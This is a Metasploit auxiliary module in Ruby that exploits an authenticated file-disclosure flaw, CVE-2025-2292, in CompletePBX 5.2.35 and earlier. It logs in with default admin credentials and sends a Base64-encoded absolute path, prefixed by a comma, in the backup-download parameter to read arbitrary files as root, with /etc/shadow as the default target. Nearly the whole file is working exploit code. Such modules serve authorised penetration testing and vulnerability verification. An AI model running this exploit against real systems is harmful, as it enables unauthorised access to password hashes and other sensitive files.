##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CompletePBX Authenticated File Disclosure via Backup Download',
        'Description' => %q{
          This module exploits an authenticated file disclosure vulnerability in CompletePBX <= 5.2.35.
          The issue resides in the backup download function, where user input is not properly validated,
          allowing an attacker to access arbitrary files on the system as root.

          The vulnerability is triggered by setting the `backup` parameter to a Base64-encoded
          absolute file path, prefixed by a comma `,`. This results in the server exposing the
          file contents directly.
        },
        'Author' => [
          'Valentin Lobstein' # Research and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2292'],
          ['URL', 'https://www.xorcom.com/products/completepbx/'],
          ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
        ],
        'Privileged' => true,
        'DisclosureDate' => '2025-03-02',
        'Platform' => ['linux', 'unix'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Base path of the CompletePBX instance', '/']),
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for authentication', 'admin']),
        OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/shadow'])
      ]
    )
  end

  def login
    print_status("Attempting authentication with username: #{datastore['USERNAME']}")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'login'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'userid' => datastore['USERNAME'],
        'userpass' => datastore['PASSWORD']
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
    end

    sid_cookie = res.get_cookies.scan(/sid=[a-f0-9]+/).first

    unless sid_cookie
      fail_with(Failure::NoAccess, 'Authentication failed: No session ID received')
    end

    print_good("Authentication successful! Session ID: #{sid_cookie}")
    return sid_cookie
  end

  def run
    sid_cookie = login
    encoded_path = ',' + Rex::Text.encode_base64(datastore['TARGETFILE'])

    print_status("Attempting to read file: #{datastore['TARGETFILE']} (Encoded as: #{encoded_path})")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI']),
      'method' => 'GET',
      'headers' => {
        'Cookie' => sid_cookie
      },
      'vars_get' => {
        'class' => 'core',
        'method' => 'download',
        'backup' => encoded_path
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
    end

    if res.body.empty?
      fail_with(Failure::NotVulnerable, 'No content retrieved, the server may not be vulnerable or the file is empty.')
    end

    print_good("Content of #{datastore['TARGETFILE']}:\n#{res.body}")
  end
end
